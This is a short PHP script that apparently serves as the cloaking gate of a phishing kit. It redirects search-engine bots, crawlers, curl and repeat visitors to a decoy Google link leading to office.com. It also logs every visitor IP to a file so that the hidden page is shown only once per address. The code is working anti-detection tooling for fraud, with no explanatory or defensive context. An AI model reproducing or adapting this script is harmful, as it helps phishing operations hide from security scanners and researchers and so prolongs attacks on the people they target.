<?php


if (!empty($_SERVER['HTTP_CLIENT_IP']))  
    {

      $vis_ip=$_SERVER['HTTP_CLIENT_IP'];
    }
    elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))   
    {
      $vis_ip=$_SERVER['HTTP_X_FORWARDED_FOR'];
    }
    else
    {
      $vis_ip=$_SERVER['REMOTE_ADDR'];
    }


$agent = $_SERVER['HTTP_USER_AGENT'];


if(preg_match('/bot|yahoo|google|spider|crawler|curl|^$/i', $agent))
{
	header("Location: https://www.google.bg/url?sa=t&rct=j&q=&esrc=s&source=web&cd=3&ved=0ahUKEwjljueH4P_YAhXDh6YKHcGQAMQQFgg9MAI&url=https%3A%2F%2Fwww.office.com%2F&usg=AOvVaw297op3g8pyu3qja2RPtXVz");
}

$data   = file_get_contents('ips.txt'); 


if (strpos($data, "\r\n") !== false) {
    $data   = explode("\r\n", $data);
}
else
{
$data   = explode("\n", $data);
}




if (in_array($vis_ip,$data))
{ echo '<script>window.location.assign("https://www.google.bg/url?sa=t&rct=j&q=&esrc=s&source=web&cd=3&ved=0ahUKEwjljueH4P_YAhXDh6YKHcGQAMQQFgg9MAI&url=https%3A%2F%2Fwww.office.com%2F&usg=AOvVaw297op3g8pyu3qja2RPtXVz")</script>';

$file=fopen("ips.txt","a+"); 
          fwrite($file,$vis_ip."\r\n");
fclose($file); 
die();
}
$file=fopen("ips.txt","a+"); 
          fwrite($file,$vis_ip."\r\n");
fclose($file); 







?>